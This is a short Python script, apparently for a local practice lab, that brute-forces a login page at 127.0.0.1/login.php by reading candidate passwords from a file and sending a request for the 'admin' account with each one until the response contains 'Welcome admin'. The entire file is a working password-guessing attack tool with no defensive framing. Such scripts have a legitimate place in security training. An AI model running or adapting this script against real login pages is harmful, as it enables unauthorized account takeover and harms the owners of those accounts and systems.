import requests

# URL of the login page
url = "http://127.0.0.1/login.php"

# Read the document containing potential passwords
with open("passwords.txt", "r") as file:
    passwords = file.read().split(",")


for password in passwords:
    # Send a GET request to the login page with the username and current password
    response = requests.get(url, params={"user":"admin", "pass": password})

    # Check if the response contains the correct login message
    if "Welcome admin" in response.text:
        print("Correct password found:", password)
        break

    #To see the incorrect attempts
    # else:
    #     print("Incorrect password:", password)
